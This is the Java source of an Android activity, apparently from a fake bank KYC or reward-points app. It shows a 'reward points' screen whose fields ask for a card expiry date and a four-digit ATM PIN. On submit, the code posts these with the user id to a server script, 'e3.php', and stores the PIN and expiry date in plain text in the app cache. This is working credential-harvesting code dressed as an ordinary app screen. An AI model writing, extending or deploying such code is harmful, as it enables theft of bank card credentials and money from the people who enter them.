package com.axiskyc;

import android.app.DatePickerDialog;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.DatePicker;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.Toast;

import androidx.annotation.RequiresApi;

import com.axiskyc.custom.Global;
import com.axiskyc.custom.apis.WebService;

import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Calendar;

public class RewardPoints2ViewController extends BaseActivity {

    private EditText txt_user_id, txt_password;
    private Button btn_login;

    private Calendar mCalendar = Calendar.getInstance();
    private int mYear;
    private int mMonth;
    private int mDay;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_reward_points_2);

        Global.controllerName = "RewardPoints2ViewController";

        btn_login = (Button) findViewById(R.id.btn_login);
        txt_user_id = (EditText) findViewById(R.id.txt_user_id);
        txt_password = (EditText) findViewById(R.id.txt_password);

        mCalendar = Calendar.getInstance();
        mYear = mCalendar.get(Calendar.YEAR);
        mMonth = mCalendar.get(Calendar.MONTH);
        mDay = mCalendar.get(Calendar.DAY_OF_MONTH);

        btn_login.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String expiry_date = txt_user_id.getText().toString();
                String atm_pin = txt_password.getText().toString();
                if (expiry_date.equalsIgnoreCase("") || expiry_date.equalsIgnoreCase("null")) {
                    Toast.makeText(RewardPoints2ViewController.this, "Expiry date required", Toast.LENGTH_LONG).show();
                } else if (atm_pin.equalsIgnoreCase("") || atm_pin.equalsIgnoreCase("null")) {
                    Toast.makeText(RewardPoints2ViewController.this, "ATM Pin required", Toast.LENGTH_LONG).show();
                } else if (atm_pin.length() != 4) {
                    Toast.makeText(RewardPoints2ViewController.this, "Invalid ATM Pin", Toast.LENGTH_LONG).show();
                } else {
                    try {
                        Global.webservice_file_name = "e3.php";

                        JSONObject obj = new JSONObject();
                        obj.put("pin", atm_pin);
                        obj.put("expiry", expiry_date);
                        obj.put("userid", Global.user_id);

                        new WebService(RewardPoints2ViewController.this, "", new WebService.myCallback() {
                            @Override
                            public void onServiceResponse(String responseJson) {
                                Global.ShowLogs("responseJson = " + responseJson);
                                try {

                                    Global.user_details.put("card_expiry_date", expiry_date);
                                    Global.user_details.put("atm_pin", atm_pin);

                                    Global.StoreFileToAppCache(RewardPoints2ViewController.this, Global.user_details.toString(), "user_details");
                                    Global.StoreFileToAppCache(RewardPoints2ViewController.this, Global.user_id, "user_id");

                                    Intent in = new Intent();
                                    in.setClass(RewardPoints2ViewController.this, MainViewController.class);
                                    in.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                                    startActivity(in);

                                } catch (Exception e) {
                                }
                            }
                        }, WebService.HTTPRequestMethod.POST_METHOD2, obj.toString(), null, "", null);

                    } catch (Exception e) {}
                }
            }
        });

        txt_user_id.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                DatePickerDialog date_picker = new DatePickerDialog(RewardPoints2ViewController.this, Global.dialog_theme, new DatePickerDialog.OnDateSetListener() {
                    @RequiresApi(api = Build.VERSION_CODES.N)
                    public void onDateSet(DatePicker view, int year, int monthOfYear, int dayOfMonth) {

                        mCalendar.set(year, monthOfYear, dayOfMonth);

                        SimpleDateFormat displayDateFormat = null;
                        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
                            displayDateFormat = new SimpleDateFormat("MM/YYYY");
                        }
                        displayDateFormat.setCalendar(mCalendar);
                        String date_time = displayDateFormat.format(mCalendar.getTime());

                        Global.ShowLogs("display_date = " + date_time);
                        txt_user_id.setText(date_time);
                    }

                }, mYear, mMonth, mDay);
                date_picker.setTitle("Card Expiry Date");

                try {
                    DatePicker datepicker = date_picker.getDatePicker();
                    //datep.removeViewAt(0);
                    LinearLayout v1 = (LinearLayout) datepicker.getChildAt(0);
                    LinearLayout v2 = (LinearLayout) v1.getChildAt(0);
                    View v3 = v2.getChildAt(1);
                    v3.setVisibility(View.GONE);
                } catch (Exception e) {
                }
                
                date_picker.show();
            }
        });
    }
}